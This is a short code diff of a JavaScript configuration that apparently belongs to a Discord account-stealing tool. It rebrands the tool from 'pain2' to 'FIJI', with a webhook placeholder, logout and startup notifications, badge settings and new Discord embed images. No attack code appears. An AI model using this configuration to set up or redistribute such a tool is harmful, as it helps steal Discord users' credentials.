@@ -11,7 +11,7 @@ const fs = require("fs");
 // Initialization
 
 var config = {
-    brand: "pain2",
+    brand: "FIJI",
 
     webhook: "REPLACE_ME",
 
@@ -20,16 +20,16 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@here"],
+    ping: [true, ""],
 
     embed: {
-        username: "pain2 | t.me/pain2st",
+        username: "FIJI",
         footer: {
-            text: `pain2 | t.me/pain2st`,
-            icon_url: "https://cdn.discordapp.com/attachments/1144748092734840904/1144771855023087707/banner.png",
+            text: ``,
+            icon_url: "https://cdn.discordapp.com/attachments/1146489781262495886/1150919285405925406/fiji.png",
         },
-        href: "https://t.me/pain2st",
-        avatar_url: "https://cdn.discordapp.com/attachments/1144748092734840904/1144771855023087707/banner.png"
+        href: "https://t.me/fiji",
+        avatar_url: "https://cdn.discordapp.com/attachments/1146489781262495886/1150919285405925406/fiji.png"
     },
 
     badges: {
